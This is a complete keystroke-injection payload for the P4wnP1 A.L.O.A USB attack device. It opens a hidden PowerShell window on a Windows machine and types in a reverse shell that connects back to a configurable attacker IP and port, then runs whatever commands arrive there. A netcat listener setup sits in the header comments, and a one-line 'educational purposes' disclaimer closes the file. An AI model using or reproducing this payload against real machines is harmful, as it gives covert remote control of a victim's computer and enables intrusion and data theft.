// Windows Reverse Shell Payload (PowerShell)
// IMPORTANT: Configure your listener IP and PORT before use
// Compatible with P4wnP1 A.L.O.A
// 
// Usage: Set up a listener first with: nc -lvnp 4444

layout('us'); // Set keyboard layout

// Configuration - CHANGE THESE VALUES
var ATTACKER_IP = "192.168.1.100";  // Your attacker machine IP
var ATTACKER_PORT = "4444";          // Your listener port

// Wait for system to be ready
delay(3000);

// Open Run dialog
press("GUI r");
delay(500);

// Run PowerShell hidden
type("powershell -WindowStyle Hidden\n");
delay(2000);

// PowerShell reverse shell one-liner
type("$client = New-Object System.Net.Sockets.TCPClient('" + ATTACKER_IP + "'," + ATTACKER_PORT + ");");
type("$stream = $client.GetStream();");
type("[byte[]]$bytes = 0..65535|%{0};");
type("while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){");
type("$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);");
type("$sendback = (iex $data 2>&1 | Out-String );");
type("$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';");
type("$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);");
type("$stream.Write($sendbyte,0,$sendbyte.Length);");
type("$stream.Flush()};");
type("$client.Close()\n");

// Note: This payload is for educational purposes only
// Always obtain proper authorization before use
